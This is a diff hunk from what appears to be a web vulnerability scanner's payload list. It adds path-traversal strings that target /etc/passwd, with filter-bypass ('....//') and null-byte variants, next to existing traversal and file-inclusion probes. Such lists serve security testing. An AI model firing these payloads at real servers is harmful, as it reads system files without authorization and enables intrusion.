@@ -11,6 +11,9 @@ C:\boot.ini.html
 ../../../../../../../../../../../../../../../etc/passwd
 ../../../../../../../../../../../../../../../etc/passwd
 ../../../../../../../../../../../../../../../etc/passwd.html
+....//....//....//....//....//....//....//....//....//....//etc/passwd
+../../../../../../../../../../../../../../../../etc/passwd%00
+....//....//....//....//....//....//....//....//....//....//etc/passwd%00
 /etc/passwd
 https://raw.githubusercontent.com/code-scan/GourdScan/master/README.md?</request>
 <respone>java.io.FileNotFoundException:
